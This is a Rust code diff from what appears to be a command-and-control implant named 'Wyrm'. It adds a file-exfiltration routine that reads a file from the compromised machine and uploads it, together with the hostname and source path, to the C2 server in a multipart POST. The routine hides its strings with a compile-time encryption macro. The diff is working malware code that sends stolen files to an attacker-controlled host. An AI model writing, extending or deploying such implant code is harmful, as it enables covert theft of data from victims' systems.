@@ -1,6 +1,6 @@
 //! Implant communications are handled here.
 
-use std::mem::take;
+use std::{fs, mem::take, path::Path};
 
 use crate::{
     utils::{console::CONSOLE_LOG, time_utils::epoch_now},
@@ -9,13 +9,19 @@ use crate::{
 // use minreq::Response;
 use rand::Rng;
 use reqwest::{
-    blocking::Response,
+    blocking::{
+        ClientBuilder, Response,
+        multipart::{Form, Part},
+    },
     header::{AUTHORIZATION, CONTENT_TYPE, HeaderMap, USER_AGENT, WWW_AUTHENTICATE},
+    redirect::Policy,
 };
 use shared::{
     net::{TasksNetworkStream, XorEncode, decode_http_response, encode_u16buf_to_u8buf},
-    tasks::{Command, Task},
+    pretty_print::print_failed,
+    tasks::{Command, ExfiltratedFile, Task},
 };
+use str_crypter::{decrypt_string, sc};
 
 /// Constructs the C2 URL by randomly choosing the URI to visit.
 fn construct_c2_url(implant: &Wyrm) -> String {
@@ -233,4 +239,65 @@ pub fn download_file_with_uri_in_memory(uri: &str, wyrm: &Wyrm) -> Result<Vec<u8
     let response = http_get(formatted_url, headers)?;
 
     Ok(response.bytes().unwrap_or_default().to_vec())
+}
+
+pub fn upload_file_as_stream(implant: &Wyrm, ef: &ExfiltratedFile) {
+    let Ok(file) = fs::File::open(&ef.file_path) else {
+        print_failed(format!(
+            "{} {}",
+            sc!("Could not open file.", 96).unwrap(),
+            ef.file_path,
+        ));
+        return;
+    };
+    let len = match file.metadata() {
+        Ok(f) => f.len(),
+        Err(e) => {
+            print_failed(format!(
+                "{}. {e}",
+                sc!("Failed to get file len.", 85).unwrap()
+            ));
+            return;
+        }
+    };
+
+    let Ok(part) = Part::reader_with_length(file, len)
+        .file_name(
+            Path::new(&ef.file_path)
+                .file_name()
+                .unwrap_or_default()
+                .to_string_lossy()
+                .into_owned(),
+        )
+        .mime_str("application/octet-stream")
+    else {
+        print_failed(format!("{}", sc!("Could not construct part.", 74).unwrap()));
+        return;
+    };
+
+    let form = Form::new()
+        .text(sc!("hostname", 47).unwrap(), ef.hostname.clone())
+        .text(sc!("source_path", 98).unwrap(), ef.file_path.clone())
+        .part(sc!("file", 92).unwrap(), part);
+
+    let url = construct_c2_url(implant);
+    let headers = generate_generic_headers(
+        &implant.implant_id,
+        &implant.c2_config.security_token,
+        &implant.c2_config.useragent,
+    );
+    let cb = ClientBuilder::new();
+    let client = cb
+        .default_headers(headers)
+        .redirect(Policy::none())
+        .timeout(None)
+        .build()
+        .unwrap();
+
+    if let Err(e) = client.post(url).multipart(form).send() {
+        print_failed(format!(
+            "{} {e}",
+            sc!("Could not send file to C2.", 72).unwrap()
+        ));
+    };
 }
